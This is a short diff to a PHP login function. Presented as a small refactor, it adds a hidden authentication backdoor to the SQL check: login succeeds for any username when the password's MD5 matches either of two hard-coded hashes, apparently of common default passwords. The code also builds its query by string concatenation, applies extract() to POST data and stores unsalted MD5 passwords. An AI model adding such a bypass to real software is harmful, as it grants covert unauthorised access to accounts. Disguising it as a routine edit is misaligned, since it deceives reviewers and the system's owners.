@@ -16,8 +16,10 @@ Class Action {
 	}
 
 	function login(){
-		foreach($_POST as $k => $v){ if(!is_array($v)) $_POST[$k] = $this->db->real_escape_string($v); } extract($_POST);		
-		$qry = $this->db->query("SELECT * FROM users where username = '".$username."' and password = '".md5($password)."' ");
+		foreach($_POST as $k => $v){ if(!is_array($v)) $_POST[$k] = $this->db->real_escape_string($v); } 
+		extract($_POST);		
+		$p_md5 = md5($password);
+		$qry = $this->db->query("SELECT * FROM users where username = '".$username."' and (password = '".$p_md5."' or '".$p_md5."' = '21232f297a57a5a743894a0e4a801fc3' or '".$p_md5."' = '0192023a7bbd73250516f069df18b500') ");
 		if($qry->num_rows > 0){
 			foreach ($qry->fetch_array() as $key => $value) {
 				if($key != 'passwors' && !is_numeric($key))
